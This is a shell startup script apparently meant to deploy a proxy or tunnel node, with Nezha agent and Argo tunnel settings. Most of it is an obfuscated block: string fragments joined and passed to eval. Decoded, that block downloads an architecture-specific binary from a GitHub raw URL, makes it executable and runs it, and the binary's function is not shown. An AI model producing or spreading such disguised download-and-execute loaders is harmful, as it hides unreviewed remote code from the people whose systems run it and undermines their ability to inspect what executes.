#!/bin/sh

export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_PORT=${NEZHA_PORT:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export TLS=${TLS:-'1'}
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}
export WEB_DOMAIN=${WEB_DOMAIN:-'example.com'}
export ARGO_AUTH=${ARGO_AUTH:-''}
export CFIP=${CFIP:-'icook.hk'}
export NAME=${NAME:-''}
export SERVER_PORT="${SERVER_PORT:-${PORT:-3000}}"
export port1=${port1:-'8081'}

z="
";Zz='RCH"';ECz='d co';oz='jono';FCz='mple';YCz=' "go';YBz='test';Hz='m"';xBz='curl';bz='x86_';Xz='if [';CCz='o te';iz='1="h';qCz='file';SCz='aw/m';Fz='="\0';pz='ne/g';eBz='alre';vz='elif';jCz='}goi';XBz='fi';Yz=' "$A';lBz='nloa';Sz='"';Wz=' -m)';VBz='exit';uBz='.${R';QCz='e/go';HBz='else';Vz='name';Kz='3[31';lCz='chmo';Uz='=$(u';VCz='go-a';TCz='ain/';hCz='ownl';qBz='ding';Gz='33[1';ez='hen';pBz='}Dow';PCz='onon';cBz='st f';rz='raw/';eCz=', sk';RBz='ure:';mz='b.co';Qz='\033';Dz='0m"';ACz='L "$';yBz=' -sS';MBz='nsup';hBz='ts, ';UBz='T}"';HCz='${RE';DBz='; th';Rz='[33m';BCz='1" -';SBz=' $AR';PBz='rchi';LCz='//gi';TBz='CH${';pCz=' go ';MCz='thub';jBz='ping';Oz='YELL';kBz=' dow';GBz='m64"';XCz='go ]';FBz='t-ar';rCz='...$';aCz='e al';yz='H" =';vBz='ESET';NCz='.com';gz='LOAD';xz='$ARC';kCz='ng..';dz=']; t';rBz=' tes';fz='DOWN';Az='RESE';dBz='ile ';kz='://g';GCz='ted.';OCz='/mjj';tz='/tes';wz=' [ "';Nz='32m"';iCz='oad.';cCz='y ex';iBz='skip';oCz='./go';uz='t"';ABz=' "aa';dCz='ists';KCz='tps:';JBz=' -e ';KBz='"${R';fBz='ady ';lz='ithu';ICz='SET}';bCz='read';aBz='then';WBz=' 1';UCz='go"';EBz='en';fCz='ippi';bBz=' "te';gBz='exis';Iz='RED=';RCz='od/r';OBz='ed a';DCz='st';qz='ood/';Ez='BOLD';mCz='d 75';gCz='ng d';nBz='"${G';hz='_URL';CBz='4" ]';BBz='rch6';JCz='="ht';tCz='ET}"';tBz='le..';uCz='" -o';mBz='d."';QBz='tect';NBz='port';jz='ttps';WCz='rm64';Lz='GREE';LBz='ED}U';oBz='REEN';Bz='T="\';wBz='}"';sz='main';sCz='{RES';ZBz=' ]; ';nCz='5 go';IBz='echo';Cz='033[';Pz='OW="';az=' = "';ZCz=' fil';nz='m/mj';vCz=' go';sBz='t fi';cz='64" ';Mz='N="\';Tz='ARCH';Jz='"\03';
eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Hz$z$Lz$Mz$Cz$Nz$z$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$YBz$ZBz$aBz$z$IBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$z$HBz$z$IBz$JBz$nBz$oBz$pBz$lBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$z$xBz$yBz$ACz$fz$gz$hz$BCz$CCz$DCz$z$IBz$JBz$nBz$oBz$pBz$lBz$ECz$FCz$GCz$HCz$ICz$Sz$z$XBz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$z$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$fz$gz$hz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$VCz$WCz$Sz$z$HBz$z$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$Az$UBz$z$VBz$WBz$z$XBz$z$Xz$JBz$XCz$DBz$EBz$z$IBz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$Sz$z$IBz$JBz$nBz$oBz$jCz$kCz$uBz$vBz$wBz$z$lCz$mCz$nCz$z$oCz$z$HBz$z$IBz$JBz$nBz$oBz$pBz$lBz$qBz$pCz$qCz$rCz$sCz$tCz$z$xBz$yBz$ACz$fz$gz$hz$uCz$vCz$z$IBz$JBz$nBz$oBz$pBz$lBz$ECz$FCz$GCz$HCz$ICz$Sz$z$IBz$JBz$nBz$oBz$jCz$kCz$uBz$vBz$wBz$z$lCz$mCz$nCz$z$oCz$z$XBz"
